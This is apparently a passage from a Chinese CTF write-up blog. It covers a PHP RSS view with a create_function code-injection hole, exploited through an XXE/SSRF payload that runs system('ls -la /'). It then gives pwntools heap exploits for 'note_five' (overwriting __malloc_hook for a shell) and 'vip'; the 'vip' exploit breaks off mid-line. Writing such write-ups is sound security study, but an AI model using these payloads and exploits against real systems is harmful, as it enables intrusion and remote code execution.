<p>View/Admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;;(&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;package/header.php&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="variable">$rss</span>) &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">rss</span>-<span class="title">head</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">RSS</span>解析失败&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站<span class="title">RSS</span>资源可能存在错误无法解析&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站<span class="title">RSS</span>资源可能已经关闭&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站可能禁止<span class="title">PHP</span>获取此内容&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;可能由于来自本站的访问过多导致暂时访问限制<span class="title">Orz</span>&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">exit</span>;</span></span><br><span class="line"><span class="class">&#125;;</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">rss_sort_date</span>($<span class="title">str</span>)</span>&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">strtotime</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y年m月d日 H时i分&quot;</span>,<span class="variable">$time</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">rss</span>-<span class="title">head</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-12 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">link</span>;?&gt;&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">title</span>;?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">span</span> <span class="title">style</span>=&quot;<span class="title">font</span>-<span class="title">size</span>: 16<span class="title">px</span>;<span class="title">font</span>-<span class="title">style</span>: <span class="title">italic</span>;<span class="title">width</span>:100%;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">link</span>;?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">description</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span>(<span class="title">isset</span>($<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">lastBuildDate</span>)&amp;&amp;$<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">lastBuildDate</span>!=&quot;&quot;)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; 最后更新:&quot;</span>.<span class="title function_ invoke__">rss_sort_date</span>(<span class="variable">$rss</span>-&gt;channel-&gt;lastBuildDate).<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>-<span class="title">list</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>:10<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">    $<span class="title">data</span> = [];</span></span><br><span class="line"><span class="class">    <span class="title">foreach</span>($<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">item</span> <span class="title">as</span> $<span class="title">item</span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span>[] = <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">usort</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return strcmp($a-&gt;&#x27;</span>.<span class="variable">$order</span>.<span class="string">&#x27;,$b-&gt;&#x27;</span>.<span class="variable">$order</span>.<span class="string">&#x27;);&#x27;</span>));</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">        &lt;article <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">link</span>;?&gt;&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">title</span>;?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">description</span>;?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">article</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">i</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">rss_sort_date</span>($<span class="title">item</span>-&gt;<span class="title">pubDate</span>);?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">i</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    <span class="title">for</span>($<span class="title">i</span>=0;$<span class="title">i</span>&lt;<span class="title">count</span>($<span class="title">item</span>-&gt;<span class="title">category</span>);$<span class="title">i</span>++)</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$item</span>-&gt;category[<span class="variable">$i</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$i</span>+<span class="number">1</span>!=<span class="title function_ invoke__">count</span>(<span class="variable">$item</span>-&gt;category))&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$item</span>-&gt;author)&amp;&amp;<span class="variable">$item</span>-&gt;author!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;i <span class="class"><span class="keyword">class</span>=&quot;<span class="title">fa</span> <span class="title">fa</span>-<span class="title">user</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                        <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">author</span>;</span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">article</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> &#125;?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    免责声明:本站只提供<span class="title">RSS</span>解析,解析内容与本站无关,版权归来源网站所有</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(&#x27;<span class="title">package</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;) ?&gt;</span></span><br></pre></td></tr></table></figure><br>可以看到<code>usort($data, create_function(&#39;$a, $b&#39;, &#39;return strcmp($a-&gt;&#39;.$order.&#39;,$b-&gt;&#39;.$order.&#39;);&#39;));</code>，可以进行代码注入，<br>在xxe中构造<code>php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&amp;order=id%2Cid)%3B%7D%3Bdie(system(&#39;ls%20-la%20%2F&#39;))%3B%2F*</code>，直接用<code>system</code>执行列目录就行，在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h3><p>unsortedbin attack and fastbin attack<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./note_five&quot;</span>)</span><br><span class="line">a = e.libc</span><br><span class="line">p = remote(<span class="string">&quot;112.126.103.195&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    p.sl(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0x2d0</span>)+<span class="string">&quot;\xf0&quot;</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x2d0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;c&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># overlap it</span></span><br><span class="line">pay = <span class="string">&#x27;b&#x27;</span> * <span class="number">0xe0</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p16(<span class="number">0x37f8</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25cf</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;a&quot;</span>*<span class="number">9</span>+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">24</span>)</span><br><span class="line">libc_createress = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c5600</span></span><br><span class="line"><span class="comment"># fastbin attack !!</span></span><br><span class="line">pian = <span class="number">0x7ffff7dd1b10</span> - <span class="number">0x7ffff7dd196f</span></span><br><span class="line">malloc_hook_one = a.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-pian+libc_createress</span><br><span class="line">malloc_hook_two = a.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0xc0</span>+libc_createress</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_hook_one))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(libc_createress+<span class="number">0x3c36e0</span>)+p64(<span class="number">0</span>)*<span class="number">22</span>+p64(<span class="number">0xff</span>))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_hook_two))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">21</span> + p64(libc_createress+<span class="number">0x4526a</span>)+ p64(a.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]+<span class="number">13</span>+libc_createress))</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h3><p>利用随机数爆破fd 改指针使得可以edit 然后攻击list getshell。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./vip&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./vip&quot;</span>)</span><br><span class="line">a = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;112.126.103.14&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">x</span>):</span><br><span class="line">    p.recvunitl(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line">    p.rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x63</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x63</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x40</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;waitting 